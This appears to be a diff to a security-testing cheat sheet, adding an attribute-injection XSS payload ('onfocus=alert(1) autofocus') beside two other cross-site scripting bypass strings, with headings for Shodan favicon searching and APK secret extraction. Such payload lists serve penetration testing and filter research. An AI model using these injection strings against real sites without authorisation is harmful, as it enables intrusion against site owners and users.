@@ -77,6 +77,8 @@ print('[+]shodan search query: http.favicon.hash:'+str(hash))
 ```
 xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
 "/><details/open/ontoggle=promt(1)>
+
+"onfocus="alert(1)"autofocus="abc
 ```
 
 # One liner to extract sensitive info from android apk
